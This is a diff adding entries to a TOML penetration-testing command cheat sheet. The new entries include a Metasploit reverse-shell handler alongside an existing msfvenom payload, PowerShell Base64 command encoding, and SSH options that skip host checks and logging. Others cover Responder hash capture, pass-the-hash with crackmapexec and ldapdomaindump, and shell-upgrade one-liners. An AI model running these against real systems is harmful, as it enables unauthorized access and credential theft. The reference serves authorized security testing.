@@ -46,21 +46,55 @@ examples = [
 [command.xfreerdp0]
 name_exe = "xfreerdp"
 cmd_types = "network"
-args = "/u:<user> /p:<password> /v:<ip|127.0.0.1>"
+args = "/cert:ignore /u:<user> /p:<password> /v:<ip|127.0.0.1>"
 explanation = """
 Connect with GUI to an Windows machine with RDP protocol.
 """
 examples = [
     "xfreerdp /u:user /p:password /v:127.0.0.1"
 ]
+[command.xfreerdp1]
+name_exe = "xfreerdp"
+cmd_types = "network"
+args = "/cert:<status|ignore> /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1>"
+explanation = """
+Connect with GUI to an Windows machine with RDP protocol.
+"""
+examples = [
+    "xfreerdp /u:user /p:password /v:127.0.0.1"
+]
+[command.pwsh0]
+name_exe = "pwsh-preview"
+cmd_types = "misc"
+args = "-c '[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(<comamnd>))'"
+explaination = """
+Convert command to Base64String with PowerShell.
+"""
+examples = [
+    "pwsh-preview -c \"Convert::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('ping 127.0.0.1')\""
+]
 
+[command.ssh0]
+name_exe = "ssh"
+cmd_types = "network"
+args = "-o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' <conn|user@127.0.0.1>"
+explaination = """
+Connect with SSH without saving nor checking known host.
+"""
+examples = [
+    "ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' user@127.0.0.1"
+]
 
 # ===== SYSADMIN COMMANDS =====
 [command.shell0]
 name_exe = "python3"
 cmd_types = "sysadmin"
 explanation = "Upgrade shell for more flexibility"
-args = "-c 'import os; os.system(\"/bin/bash -p\")'"
+args = "-c 'import pty; pty.spawn(\"/bin/bash\")'"
+examples = [
+    "python3 -c 'import os; os.system(\"/bin/bash -p\")'",
+    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+]
 [command.capabilities0]
 name_exe = "getcap"
 cmd_types = "sysadmin"
@@ -93,6 +127,15 @@ cmd_types = "sysadmin"
 explanation = "Check file/folder permission for users"
 args = "<path>"
 
+[command.mysql0]
+name_exe = "mysql"
+cmd_types = "sysadmin"
+explanation = "Connect to a mysql database"
+args = "-u <username|root> -p<password> -P <port|3306> --host <ip|127.0.0.1> <dbname>"
+examples = [
+    "mysql -u root -p user -P pass --host 127.0.0.1 bddname"
+]
+
 # ===== PENTEST COMMANDS =====
 [command.nmap0]
 name_exe = "nmap"
@@ -108,7 +151,8 @@ cmd_types = "pentest|network"
 explanation = "Version -sV, default script -sC"
 args = "-n -sC -sV <ip|127.0.0.1>"
 examples = [
-    "nmap -sC -sV 127.0.0.1"
+    "nmap -sC -sV 127.0.0.1",
+    "nmap -sV -p 443 --script 'vuln'"
 ]
 [command.nmap2]
 name_exe = "nmap"
@@ -146,9 +190,9 @@ examples = [
 name_exe = "snmpwalk"
 cmd_types = "pentest|network"
 explanation = "SNMP Enumeration"
-args = "-c <community|public> -v1 -t 10 <ip|127.0.0.1>"
+args = "-c <community|public> -v1 -t 10 <ip|127.0.0.1> -Oa"
 examples = [
-    "snmpwalk -c public -v1 -t 10 127.0.0.1  # Enumerate entire MIB Tree",
+    "snmpwalk -c public -v1 -t 10 127.0.0.1 -Oa # Enumerate entire MIB Tree (-Oa: used to decode hexadecimal)",
     "snmpwalk -c public -v1 127.0.0.1 1.3.6.1.4.1.77.1.2.25  # Enumerate all users on the Windows machine",
     "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2  # List all machine running processes",
     "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2  # List all machine installed softwares",
@@ -165,10 +209,12 @@ examples = [
 [command.ffuf0]
 name_exe = "ffuf"
 cmd_types = "pentest"
-explanation = "Bruteforce directory, FUZZ keyword is mandatory and a `/` at the end also otherwise it's not gonna work"
-args = "-w <list_path|file.txt> -u <url|http://localhost>/FUZZ/ -t 100"
+explanation = """Bruteforce directory, FUZZ keyword is mandatory and a `/` at the end also otherwise it's not gonna work.
+There is also a filter response size to avoid false positives.
+"""
+args = "-w <list_path|file.txt> -u http://<url|localhost>/FUZZ/ -t 100 -fs <response-size|1000>"
 examples = [
-    "ffuf -u http://localhost/FUZZ/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt"
+    "ffuf -u http://localhost/FUZZ/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 1000"
 ]
 [command.ffuf1]
 name_exe = "ffuf"
@@ -194,6 +240,15 @@ args = "<url|http://127.0.0.1/> <list>"
 examples = [
     "dirb http://10.10.11.242/ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
 ]
+[command.gobuster0]
+name_exe = "gobuster"
+cmd_types = "pentest"
+explanation = "Bruteforce url paths with blacklist status code"
+args = "dir -u <ip|127.0.0.1> -w <list.txt|/opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt> -t 5 --status-codes-blacklist <code|404>"
+examples = [
+    "gobuster dir -u 127.0.0.1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 --status-codes-blacklist 404,301"
+]
+
 [command.find0]
 name_exe = "find"
 cmd_types = "pentest|sysadmin"
@@ -210,6 +265,15 @@ args = "-p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|
 examples = [
     "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
 ]
+[command.msfconsole0]
+name_exe = "msfconsole"
+cmd_types = "pentest"
+explanation = "Handler reverse shell tcp"
+args = "-q -x 'use exploit/multi/handler;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run;'"
+examples = [
+    "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run;'"
+]
+
 [command.hashcat0]
 name_exe = "hashcat"
 cmd_types = "pentest"
@@ -231,6 +295,67 @@ args = "-i <milli|100>"
 examples = [
     "pspy64s -i 100"
 ]
+[command.nmap3]
+name_exe = "cat"
+cmd_types = "pentest"
+explanation = """
+Search in the nmap NSE scripts for vuln (can search the impact of the script - safe/intrusive).
+There is also an example of reloading the script.db file if a new '.nse' file was added."""
+args = "/usr/share/nmap/scripts/script.db | grep '<search|safe>'"
+examples = [
+    "cat /usr/share/nmap/scripts/script.db | grep 'vuln'",
+    "nmap --script-updatedb"
+]
+[command.ldapdomaindump0]
+name_exe = "ldapdomaindump"
+cmd_types = "pentest"
+explanation = "Dump LDAP information"
+args = "-u '<DOMAIN\\user|CORP.local\\user>' -p '<LM:NTLM>' -at NTLM ldap://<ip|127.0.0.1>"
+examples = [
+    "ldapdomaindump -u 'CORP.local\\user' -p 'ba0ecf3dcda348e7a91e548719c3ac6e:12943dbced43cd06a0445dd11fac3a7d' -at NTLM ldap://127.0.0.1"
+]
+
+[command.crackmapexec0]
+name_exe = "crackmapexec"
+cmd_types = "pentest"
+explanation = "List shares on list of machines"
+args = "smb <ipsfile|ips.txt> -u <username> -H <NTHASH> --shares"
+examples = [
+    "crackmapexec smb ips.txt -u user -H <NTHASH> --shares"
+]
+[command.smbclient0]
+name_exe = "smbclient.py"
+cmd_types = "pentest"
+explanation = "Setup an smb share"
+args = "<share|c> <path|./>"
+examples = [
+    "smbclient.py c ./"
+]
+[command.http_server0]
+name_exe = "python3 -m http.server"
+cmd_types = "pentest"
+explanation = "Setup an HTTP server"
+args = "--bind <ip|127.0.0.1> <port|8000>"
+examples = [
+    "python3 -m http.server --bind 127.0.0.1 8000"
+]
+[command.Responder0]
+name_exe = "sudo python3 Responder.py"
+cmd_types = "pentest"
+explanation = "Gather NTHASH on network"
+args = "-I <local-interface> -i <ip|127.0.0.1>"
+examples = [
+    "sudo python3 Responder.py -I enp0s3 -i 192.168.3.85"
+]
+[command.mssqlclient0]
+name_exe = "python3 mssqlclient.py"
+cmd_types = "pentest"
+explanation = "Connect to a MSSQL database instance"
+args = "<username:password@ip|sa:pass@127.0.0.1> -db <dbname>"
+examples = [
+    "mssqlclient.py sa:password@127.0.0.1 -db database"
+]
+
 
 # ===== REVERSE COMMANDS =====
 [command.objdump0]
